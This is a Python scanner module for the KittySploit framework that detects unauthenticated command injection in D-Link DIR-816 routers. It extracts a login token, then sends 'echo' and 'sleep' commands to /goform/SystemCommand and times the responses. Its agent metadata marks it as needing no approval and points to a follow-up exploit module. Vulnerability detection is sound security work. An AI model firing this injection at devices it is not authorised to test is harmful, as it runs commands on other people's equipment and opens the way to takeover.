#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-816 SystemCommand RCE (Jul 2019)."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR-816 - SystemCommand RCE Detection',
        'description': (
            'Detects DIR-816 A2 command injection by extracting tokenid from '
            '/dir_login.asp then POSTing sleep commands to /goform/SystemCommand and '
            'timing the response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'dlink', 'router', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.5,
            'noise': 0.6,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/dlink_dir816_systemcommand_rce',
                ],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/47150',
        ],
    }

    def run(self):
        login = self.http_request(method='GET', path='/dir_login.asp', allow_redirects=False)
        if not login:
            return False
        m = re.search(r'name=["\']tokenid["\']\s*value=["\']([0-9a-z]+)["\']', login.text or '', re.I)
        if not m:
            return False
        token = m.group(1)

        def _timed(cmd: str) -> float:
            t0 = time.time()
            self.http_request(
                method='POST',
                path='/goform/SystemCommand',
                data=f'command={cmd}&tokenid={token}',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            return time.time() - t0

        # Baseline (fast) then delayed sleeps — reduces latency-based FPs.
        baseline = _timed('echo 1')
        if baseline >= 2.5:
            return False
        d3 = _timed('sleep 3')
        d5 = _timed('sleep 5')
        if d3 >= 3 and d3 <= baseline + 7 and d5 >= 5 and d5 <= baseline + 9 and d5 > d3 + 1.2:
            self.set_info(
                severity='critical',
                reason='D-Link DIR-816 SystemCommand timed sleep RCE',
                path='/goform/SystemCommand',
            )
            return True
        return False
